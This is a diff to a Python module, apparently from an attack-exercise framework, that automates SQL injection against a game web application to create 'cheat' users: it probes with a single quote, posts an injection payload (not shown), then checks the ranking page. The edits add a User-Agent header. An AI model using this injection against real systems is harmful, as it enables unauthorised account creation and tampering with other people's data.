@@ -9,13 +9,12 @@ import hashlib
 import random
 from os import urandom
 
-
 class AtkGameCheatSQLi(object):
     def __init__(self, utility, host="127.0.0.1", port="80", debug=False):
         self.utility = utility
-        self.utility.target = host
         self.host = host
         self.port = port
+        self.ua = utility.ua
         self.debug = debug
         self.description = "The module can be create cheat users if SQLi is not fix yet."
         self.target = host + ":" + port
@@ -57,7 +56,7 @@ class AtkGameCheatSQLi(object):
             if content_flag == "create":
                 json_data = { "user_name": "'", "password": "password", "nick_name":"hack"}      
 
-            headers = { "Content-Type": "application/json" }
+            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
             response1 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
 
             print("-----sqli check-----")
@@ -99,8 +98,7 @@ class AtkGameCheatSQLi(object):
             if content_flag == "create":
                 json_data = { "user_name": payload, "password": "password", "nick_name":"hack"}    
 
-            headers = { "Content-Type": "application/json" }
-
+            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
             response2 = session.post(target_url, data=json.dumps(json_data), headers=headers, proxies=proxies, timeout=timeoutvalue)
 
             print("-----execute sqli----")
@@ -110,7 +108,8 @@ class AtkGameCheatSQLi(object):
             self.logger("Attack complete", "+")
 
             target_url = "http://" + target_host + "/ranking"
-            response3 = session.get(target_url, proxies=proxies, timeout=timeoutvalue)
+            headers = { "Content-Type": "application/json", "User-Agent": self.ua }
+            response3 = session.get(target_url, proxies=proxies, headers=headers, timeout=timeoutvalue)
 
             print("-----ranking-----")
             print("Status code:   %i" % response3.status_code)
